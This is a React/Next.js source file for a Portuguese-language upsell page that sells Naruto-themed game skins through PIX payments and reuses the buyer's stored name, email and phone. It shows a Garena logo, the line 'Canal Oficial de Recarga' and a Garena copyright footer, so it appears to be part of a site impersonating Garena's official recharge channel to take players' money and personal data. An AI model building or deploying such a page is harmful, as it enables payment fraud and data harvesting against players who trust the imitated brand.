"use client";

import { useState, useEffect } from "react";
import Image from "next/image";
import "./upsell.css"; // 🔥 CSS separado

export default function UpsellPage() {
  const [selected, setSelected] = useState<string[]>([]);
  const [checkoutData, setCheckoutData] = useState<any>({});

  // 🔥 Itens do upsell
  const items = [
    { id: "offer1", name: "Skin Itachi", price: 14.9, img: "/Screenshot-26.webp" },
    { id: "offer2", name: "Skin Madara", price: 18.7, img: "/Screenshot-28.webp" },
    { id: "offer3", name: "Skin Minato", price: 9.9, img: "/Screenshot-29.webp" },
    { id: "offer4", name: "Skin Obito", price: 14.9, img: "/Screenshot-30.webp" },
    { id: "offer5", name: "Skin Orochimaru", price: 19.9, img: "/Screenshot-27.webp" },
  ];

  const toggleItem = (id: string) => {
    setSelected((prev) =>
      prev.includes(id) ? prev.filter((x) => x !== id) : [...prev, id]
    );
  };

  const total = items
    .filter((i) => selected.includes(i.id))
    .reduce((acc, i) => acc + i.price, 0);

  // ✅ Carregar dados do checkout salvos no sessionStorage
  useEffect(() => {
    if (typeof window !== "undefined") {
      const storedData = sessionStorage.getItem("checkoutData");
      if (storedData) {
        setCheckoutData(JSON.parse(storedData));
      }
    }
  }, []);

  const handlePayment = async () => {
    if (total <= 0) {
      alert("Selecione pelo menos uma skin!");
      return;
    }

    const amountCents = Math.round(total * 100); // ✅ só o valor das skins
    const orderId = Date.now().toString();
    const description = `Skins - Pedido #${orderId}`; // ✅ descrição clara

    const payer = {
      name: checkoutData?.name || "",
      email: checkoutData?.email || "",
      phone: checkoutData?.phone || "",
    };

    try {
      const response = await fetch("/api/checkout", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ amount: amountCents, orderId, description, payer }),
      });

      const data = await response.json();

      if (!response.ok || !data.id) {
        alert("Erro ao gerar PIX.");
        return;
      }

      // ✅ Salvar só os dados novos do upsell
      const checkoutUpsellPix = {
        type: "upsell",
        items: items.filter((i) => selected.includes(i.id)), // guarda quais skins
        total,
        transactionId: data.id,
        brcode: data.brcode,
        qrBase64: data.qrBase64,
        createdAt: Date.now(),
        payer,
      };

      sessionStorage.setItem("pixCheckout", JSON.stringify(checkoutUpsellPix));

      // Redireciona para a página de pagamento
      setTimeout(() => {
        window.location.href = "/buy";
      }, 1500);
    } catch (err) {
      alert("Falha na integração PIX.");
    }
  };

  return (
    <main>
      {/* 🔥 HEADER igual ao checkout */}
      <header>
        <div className="container nav">
          <div className="brand">
            <div className="brand-text">
              <Image src="/image.png" alt="Garena Logo" width={100} height={40} />
              <span className="divider"></span>
              <span>Canal Oficial de Recarga</span>
            </div>
          </div>
          <div className="profile" title="Perfil">
            <Image
              src="/ff.webp"
              alt="Perfil"
              width={40}
              height={40}
              className="rounded-full object-cover"
            />
          </div>
        </div>
      </header>

      {/* 🔥 Conteúdo do upsell */}
      <div className="checkout">
        <h2>OFERTA EXCLUSIVA DE SKINS</h2>
        <p className="subtext">
          Sua compra foi um sucesso! Que tal adicionar estas skins raras à sua coleção por um preço especial?
        </p>

        <div className="offer-container">
          {items.map((item) => (
            <div
              key={item.id}
              className="offer-item"
              onClick={() => toggleItem(item.id)}
            >
              <div className="offer-left">
                <Image src={item.img} alt={item.name} width={80} height={80} />
                <div className="offer-info">
                  <h3>{item.name}</h3>
                  <span>R$ {item.price.toFixed(2).replace(".", ",")}</span>
                </div>
              </div>
              <input
                type="checkbox"
                checked={selected.includes(item.id)}
                onChange={() => toggleItem(item.id)}
              />
            </div>
          ))}
        </div>

        {/* Total */}
        <div className="offer-total">
          <span>Total:</span>
          <span className="total">R$ {total.toFixed(2).replace(".", ",")}</span>
        </div>

        {/* Botão de pagar */}
        <button className="btn-submit" onClick={handlePayment}>
          Adicionar e Pagar R$ {total.toFixed(2).replace(".", ",")}
        </button>

        {/* Botão "não quero" */}
        <a href="/" className="no-thanks">
          Não, obrigado.
        </a>
      </div>
      {/* FOOTER */}
<footer className="footer">
  <div className="container footer-inner">
    <span>© 2025 Garena Online. Todos os direitos reservados.</span>
    <div className="footer-links">
      <a href="#">FAQ</a>
      <a href="#">Termos e Condições</a>
      <a href="#">Política de Privacidade</a>
    </div>
  </div>
</footer>

    </main>
  );
}
